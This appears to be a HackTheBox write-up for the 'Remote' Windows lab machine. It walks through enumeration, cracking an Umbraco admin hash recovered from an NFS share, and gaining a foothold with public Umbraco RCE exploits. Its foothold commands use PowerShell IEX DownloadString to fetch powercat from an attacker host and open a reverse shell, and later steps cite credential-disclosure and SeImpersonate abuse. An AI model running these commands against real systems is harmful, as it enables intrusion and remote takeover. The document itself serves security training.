---
title: "Remote"
date: 2024-11-03
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "htb writeup", "remote", "htb walkthrough", "hackthebox", "writeup"]
---

OS: Windows
Difficulty: Easy

## Enumeration

### Nmap

```sh
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
2049/tcp  open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

### 80-HTTP

![screenshot](/assets/images/remote1.png)

http://10.10.10.180/umbraco

![screenshot](/assets/images/remote3.png)

http://10.10.10.180/1111

![screenshot](/assets/images/remote4.png)

### FTP

![screenshot](/assets/images/remote2.png)

### RPC

```sh
rpcclient -U '' -N 10.10.10.180
rpcclient -U'%' 10.10.10.180
rpcclient -U '' 10.10.10.180
```

![screenshot](/assets/images/remote5.png)

### 2049 NFS

```sh
sudo mount -t nfs 10.10.10.180:/site_backups /home/kali/h3llanut3lla/Remote/site_backups/
```

![screenshot](/assets/images/remote6.png)

### Finding credentials

Googling `umbraco credential files` reveals -> `/App_Data/Umbraco.sdf`

```sh
string Umbraco.sdf | grep admin
```

![screenshot](/assets/images/remote7.png)

Copy the hash and format, and save it as `admin.sha1`

![screenshot](/assets/images/remote8.png)

Crack with john.

```sh
john admin.sha1 -w=/usr/share/wordlists/rockyou.txt
```
Password found.

![screenshot](/assets/images/remote9.png)

![screenshot](/assets/images/remote10.png)

![screenshot](/assets/images/remote11.png)

## Foothold

[Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/49488)

![screenshot](/assets/images/remote12.png)

```sh
python3 49488.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c "IEX (New-Object System.Net.Webclient).DownloadString("http://10.10.14.7/powercat.ps1");powercat -c 10.10.14.7 -p 9001 -e powershell"
```

```powershell
# using PowerShell to download powercat and execute a reverse shell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 10.10.14.7 -p 4444 -e powershell
```

The above didn't work. Used a different [public exploit](https://github.com/noraj/Umbraco-RCE/blob/master/exploit.py).

```sh
python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/powercat.ps1');powercat -c 10.10.14.7 -p 9001 -e powershell"
```

![screenshot](/assets/images/remote13.png)

![screenshot](/assets/images/remote14.png)

## Privilege Escalation

```sh
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

# Running services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

![screenshot](/assets/images/remote15.png)

[TeamViewer 11.0.65452 (x64) - Local Credentials Disclosure](https://www.exploit-db.com/exploits/40342)

![screenshot](/assets/images/remote17.png)

### SeImpersonate

Used PrintSpoofer to abuse SeImpersonate privilege. 

![screenshot](/assets/images/remote18.png)
